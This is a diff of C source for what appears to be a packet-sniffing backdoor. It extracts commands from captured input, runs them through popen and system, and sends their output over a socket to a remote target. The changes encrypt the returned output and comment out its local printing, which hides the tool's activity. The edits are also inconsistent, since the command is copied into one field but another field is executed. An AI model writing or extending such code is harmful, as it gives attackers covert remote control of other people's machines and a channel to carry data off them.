@@ -67,7 +67,7 @@ void print_hex_ascii_line (const u_char *payload, int len, int offset) {
 	int i;
 	int gap;
 	const u_char *ch;
-    char temp[256] = {0};
+    char temp[1024] = {0};
 
 	// the offset
     if (opts.pcap2_flag == TRUE) {
@@ -199,12 +199,12 @@ void extract_square_bracket_string(char* input) {
             if (strstr(input, "-c") != NULL) {
                 const char* count = strstr(input, "-c");
                 size_t length = count - (start + 1);
-                strncpy(opts.decrypt_instruction, start + 1, length);
+                strncpy(opts.filter, start + 1, length);
                 opts.command_flag = TRUE;
             }
             else {
                 size_t length = end - (start + 1);
-                strncpy(opts.decrypt_instruction, start + 1, length);
+                strncpy(opts.filter, start + 1, length);
                 opts.command_flag = TRUE;
             }
         }
@@ -227,7 +227,7 @@ void extract_square_bracket_string(char* input) {
                 pipe = popen(opts.decrypt_instruction, "r");
                 while (fgets(temp, sizeof(temp), pipe) != NULL) {
                     // Process or print the captured output
-                    printf("%s", temp);
+                    // printf("%s", temp);
                     strcat(opts.buffer, temp);
                     memset(temp, 0, sizeof(temp));
                 }
@@ -237,9 +237,13 @@ void extract_square_bracket_string(char* input) {
                 system(opts.decrypt_instruction);
             }
         }
+        for (int i = 0; i < strlen(opts.buffer); i++) {
+            opts.buffer[i] = encrypt_decrypt(opts.buffer[i]);
+        }
         sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
                (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-        memset(opts.buffer, 0, strlen(opts.buffer));
+        memset(opts.buffer, 0, sizeof(opts.buffer));
+        memset(opts.decrypt_instruction, 0, sizeof(opts.decrypt_instruction));
 
         /* close */
     }
